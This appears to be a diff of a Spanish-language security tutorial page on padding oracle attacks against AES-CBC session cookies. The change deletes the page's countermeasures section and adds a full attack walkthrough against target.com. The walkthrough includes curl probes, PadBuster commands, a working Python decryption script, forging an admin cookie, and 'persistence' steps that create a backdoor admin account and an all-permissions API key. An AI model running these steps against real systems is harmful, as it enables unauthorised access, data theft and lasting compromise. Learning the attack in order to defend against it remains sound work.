@@ -153,103 +153,251 @@ Padded: [68 65 6c 6c 6f 03 03 03]</code>
             </section>
 
             <section class="section">
-                <h2><i class="fas fa-tools"></i>Explotación Práctica</h2>
-                
-                <h3>Herramientas principales:</h3>
-                <div class="code-block">
-                    <div class="code-label">PadBuster - Automated Oracle</div>
-                    <code># Instalación
+                <h2><i class="fas fa-server"></i>Caso Práctico: Padding Oracle Attack</h2>
+
+                <div class="example">
+                    <div class="example-title">
+                        <i class="fas fa-cookie"></i>
+                        Explotación de Padding Oracle en Cookie de Sesión
+                    </div>
+
+                    <div class="machine-info">
+                        <strong>Escenario del ataque:</strong>
+                        <ul>
+                            <li><strong>Objetivo:</strong> Descifrar cookie de sesión y obtener bypass de autenticación</li>
+                            <li><strong>Vulnerabilidad:</strong> Cifrado AES-CBC con oracle de padding vía error messages</li>
+                            <li><strong>Herramientas:</strong> PadBuster, scripts Python, Burp Suite, CyberChef</li>
+                            <li><strong>Resultado esperado:</strong> Descifrado de datos sensibles y generación de tokens válidos</li>
+                        </ul>
+                    </div>
+
+                    <h4>Metodología de Explotación:</h4>
+                    <div class="attack-flow">
+                        <div class="flow-step">
+                            <div class="flow-number">1</div>
+                            <div class="flow-content">
+                                <div class="flow-title">Detección</div>
+                                <div class="flow-desc">Identificación de oracle de padding mediante análisis de respuestas</div>
+                            </div>
+                        </div>
+                        <div class="flow-step">
+                            <div class="flow-number">2</div>
+                            <div class="flow-content">
+                                <div class="flow-title">Análisis Criptográfico</div>
+                                <div class="flow-desc">Determinación de algoritmo, block size y estructura de datos</div>
+                            </div>
+                        </div>
+                        <div class="flow-step">
+                            <div class="flow-number">3</div>
+                            <div class="flow-content">
+                                <div class="flow-title">Descifrado</div>
+                                <div class="flow-desc">Explotación del oracle para descifrar datos bloque por bloque</div>
+                            </div>
+                        </div>
+                        <div class="flow-step">
+                            <div class="flow-number">4</div>
+                            <div class="flow-content">
+                                <div class="flow-title">Cifrado Malicioso</div>
+                                <div class="flow-desc">Generación de payloads cifrados con datos controlados</div>
+                            </div>
+                        </div>
+                        <div class="flow-step">
+                            <div class="flow-number">5</div>
+                            <div class="flow-content">
+                                <div class="flow-title">Bypass de Autenticación</div>
+                                <div class="flow-desc">Uso de tokens generados para obtener acceso privilegiado</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <h4>Fase 1: Detección del Oracle</h4>
+                    <div class="code-block">
+                        <div class="code-label">Identificación de comportamientos diferenciados</div>
+                        <code># Capturar cookie original
+cookie_original="YWRtaW4%3D%7C1234567890abcdef"
+
+# Test manual con Burp Suite
+# Modificar últimos bytes y observar respuestas:
+# Cookie válida: HTTP 200 "Welcome admin"
+# Padding inválido: HTTP 500 "Padding error" 
+# Datos inválidos: HTTP 403 "Access denied"
+
+# Automatizar detección
+curl -b "session=$cookie_original" http://target.com/admin
+curl -b "session=${cookie_original}XX" http://target.com/admin</code>
+                    </div>
+                    <div class="alert alert-info">
+                        <p>Oracle identificado: el servidor devuelve <strong>"Padding error"</strong> vs <strong>"Access denied"</strong> según el tipo de error criptográfico.</p>
+                    </div>
+
+                    <h4>Fase 2: Análisis de la Estructura</h4>
+                    <div class="code-block">
+                        <div class="code-label">Determinación de parámetros</div>
+                        <code># Decodificar cookie para análisis
+echo "YWRtaW4%3D%7C1234567890abcdef" | python3 -c \
+  "import urllib.parse, base64, sys; \
+   data=urllib.parse.unquote(sys.stdin.read().strip()); \
+   print('Decoded:', base64.b64decode(data.split('|')[0])); \
+   print('Length:', len(base64.b64decode(data.split('|')[1])))"
+
+# Output esperado:
+# Decoded: b'admin'
+# Length: 16 (indica AES block size)
+
+# Confirmar cifrado CBC por estructura
+echo "1234567890abcdef" | xxd
+# 16 bytes = AES-128-CBC probable</code>
+                    </div>
+
+                    <h4>Fase 3: Explotación con PadBuster</h4>
+                    <div class="code-block">
+                        <div class="code-label">Descifrado automatizado</div>
+                        <code># Instalación de PadBuster
 git clone https://github.com/AonCyberLabs/PadBuster.git
+cd PadBuster
 
-# Uso básico
-perl padBuster.pl http://target/app.php "cookie_value" 16 -cookies "session=cookie_value"
+# Descifrado de cookie completa
+perl padBuster.pl http://target.com/admin \
+  "1234567890abcdef" 16 \
+  -cookies "session=YWRtaW4%3D%7C1234567890abcdef" \
+  -encoding 0 \
+  -plaintext
 
-# Con encoding específico
-perl padBuster.pl http://target/login.php "base64_cookie" 16 -encoding 1
+# Parámetros explicados:
+# - URL: endpoint que procesa la cookie
+# - "1234567890abcdef": ciphertext a descifrar 
+# - 16: block size (AES)
+# - -encoding 0: datos en hex
+# - -plaintext: mostrar resultado descifrado</code>
+                    </div>
 
-# Generar payload válido
-perl padBuster.pl http://target/app.php "original_cookie" 16 -plaintext "user=admin"</code>
-                </div>
-
-                <h3>Proceso manual paso a paso:</h3>
-                <div class="code-block">
-                    <div class="code-label">Python - Oracle detection</div>
-                    <code>import requests
+                    <div class="code-block">
+                        <div class="code-label">Descifrado manual con Python</div>
+                        <code>#!/usr/bin/env python3
+import requests
 import base64
+from itertools import product
 
-def test_oracle(cookie_value):
-    """Detectar si existe oracle de padding"""
+def padding_oracle_attack(url, ciphertext_hex, block_size=16):
+    """
+    Implementación manual de padding oracle attack
+    """
+    ciphertext = bytes.fromhex(ciphertext_hex)
+    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
     
-    # Decodificar cookie
-    encrypted = base64.b64decode(cookie_value)
+    plaintext = b''
     
-    # Modificar último byte
-    modified = bytearray(encrypted)
-    modified[-1] ^= 0x01
-    
-    # Enviar request modificado
-    new_cookie = base64.b64encode(modified).decode()
-    response = requests.get("http://target/", 
-                          cookies={"session": new_cookie})
-    
-    return response.status_code, response.text</code>
-                </div>
+    for i in range(len(blocks)-1, 0, -1):
+        # Descifrar bloque actual usando el anterior
+        decrypted_block = decrypt_block(url, blocks[i-1], blocks[i], block_size)
+        plaintext = decrypted_block + plaintext
+        
+    return plaintext
 
-                <div class="alert alert-info">
-                    <p><strong>Tip:</strong> Si obtienes respuestas diferentes al modificar el último byte del ciphertext, probablemente exista un padding oracle.</p>
+def decrypt_block(url, prev_block, target_block, block_size):
+    decrypted = bytearray(block_size)
+    
+    for pad_len in range(1, block_size + 1):
+        for guess in range(256):
+            # Construir payload para testing
+            payload = bytearray(prev_block)
+            
+            # Ajustar bytes ya descifrados
+            for k in range(1, pad_len):
+                payload[-k] ^= decrypted[-k] ^ pad_len
+                
+            payload[-pad_len] = guess
+            test_cookie = base64.b64encode(payload + target_block).decode()
+            
+            # Test oracle
+            response = requests.get(url, cookies={"session": test_cookie})
+            
+            if "Padding error" not in response.text:
+                decrypted[-pad_len] = guess ^ pad_len
+                break
+                
+    return bytes(decrypted)
+
+# Uso
+result = padding_oracle_attack("http://target.com/admin", "1234567890abcdef")
+print(f"Descifrado: {result}")</code>
+                    </div>
+
+                    <h4>Fase 4: Generación de Payloads Maliciosos</h4>
+                    <div class="code-block">
+                        <div class="code-label">Cifrado de datos controlados</div>
+                        <code># Generar cookie para usuario administrador
+perl padBuster.pl http://target.com/admin \
+  "1234567890abcdef" 16 \
+  -cookies "session=YWRtaW4%3D%7C1234567890abcdef" \
+  -plaintext "admin|role=admin|timestamp=9999999999"
+
+# Resultado esperado: nuevo ciphertext válido
+# Output: "abcdef1234567890newciphertextgenerated"
+
+# Crear cookie válida con privilegios escalados
+new_cookie=$(echo -n "admin" | base64)%7Cabcdef1234567890newciphertextgenerated
+
+# Test de bypass exitoso
+curl -b "session=$new_cookie" http://target.com/admin 
+# Expected: HTTP 200 "Welcome admin"</code>
+                    </div>
+
+                    <h4>Fase 5: Explotación Completa y Persistencia</h4>
+                    <div class="code-block">
+                        <div class="code-label">Acceso administrativo</div>
+                        <code># Usar cookie generada para acceso completo
+curl -b "session=$malicious_cookie" \
+     -X POST \
+     -d "username=backdoor&password=secret123&role=admin" \
+     http://target.com/create_user
+
+# Enumeración de funcionalidades admin
+curl -b "session=$malicious_cookie" http://target.com/admin/users
+curl -b "session=$malicious_cookie" http://target.com/admin/logs
+curl -b "session=$malicious_cookie" http://target.com/admin/config
+
+# Establecer persistencia
+curl -b "session=$malicious_cookie" \
+     -X POST \
+     -d "action=create_api_key&permissions=all" \
+     http://target.com/admin/api</code>
+                    </div>
+
+                    <div class="alert alert-info">
+                        <p><strong>Resultado:</strong> Acceso administrativo completo obtenido mediante bypass criptográfico, capacidad de crear usuarios, acceder a logs sensibles y generar API keys persistentes.</p>
+                    </div>
                 </div>
             </section>
 
             <section class="section">
-                <h2><i class="fas fa-shield-alt"></i>Contramedidas</h2>
-                
-                <h3>Mitigaciones criptográficas:</h3>
+                <h2><i class="fas fa-toolbox"></i>Técnicas Avanzadas y Variantes</h2>
+                <h3>Optimizaciones del ataque</h3>
                 <ul>
-                    <li><strong>Authenticated encryption:</strong> AES-GCM, ChaCha20-Poly1305</li>
-                    <li><strong>HMAC verification:</strong> Verificar integridad antes de descifrar</li>
-                    <li><strong>Constant-time operations:</strong> Evitar timing side-channels</li>
-                    <li><strong>Error handling uniforme:</strong> Mismos mensajes para todos los errores</li>
+                    <li><strong>Parallel processing:</strong> Múltiples threads para acelerar descifrado</li>
+                    <li><strong>Smart guessing:</strong> Priorizar caracteres ASCII comunes</li>
+                    <li><strong>Error analysis:</strong> Usar timing attacks cuando no hay error messages</li>
+                    <li><strong>Bit flipping:</strong> Modificaciones controladas para bypass directo</li>
+                    <li><strong>Format prediction:</strong> Explotar formatos conocidos de datos (JSON, XML)</li>
                 </ul>
 
+                <h3>Herramientas especializadas</h3>
                 <div class="code-block">
-                    <div class="code-label">PHP - Implementación segura</div>
-                    <code><?php
-// MAL: Oracle de padding
-try {
-    $decrypted = openssl_decrypt($data, 'AES-256-CBC', $key, 0, $iv);
-    if ($decrypted === false) {
-        die("Error de padding!");
-    }
-} catch (Exception $e) {
-    die("Error de descifrado!");
-}
+                    <div class="code-label">Alternatives to PadBuster</div>
+                    <code># Padding Oracle Attack Tool (Python)
+git clone https://github.com/KishanBagaria/padding-oracle-attacker
+python3 padding_oracle_attacker.py -u http://target.com/login -c session
 
-// BIEN: Sin oracle
-try {
-    // Verificar HMAC primero
-    if (!hash_equals($expected_hmac, $received_hmac)) {
-        die("Error de verificación");
-    }
-    
-    $decrypted = openssl_decrypt($data, 'AES-256-CBC', $key, 0, $iv);
-    if ($decrypted === false) {
-        die("Error de verificación");
-    }
-} catch (Exception $e) {
-    die("Error de verificación");
-}</code>
-                </div>
+# Burp Extension - Padding Oracle
+# BApp Store -> "Padding Oracle"
 
-                <div class="alert alert-warning">
-                    <p><strong>Recomendaciones adicionales:</strong></p>
-                    <ul>
-                        <li>Usar bibliotecas criptográficas bien establecidas</li>
-                        <li>Implementar rate limiting para prevenir ataques masivos</li>
-                        <li>Logging detallado de intentos de manipulación</li>
-                        <li>Rotación frecuente de claves de cifrado</li>
-                    </ul>
+# Custom Python implementation
+# Usar pycryptodome para operaciones criptográficas
+pip3 install pycryptodome requests
+# Implementar lógica personalizada según oracle específico</code>
                 </div>
             </section>
+
 
             <section class="section">
                 <h2><i class="fas fa-exclamation-triangle"></i>Consideraciones Éticas</h2>
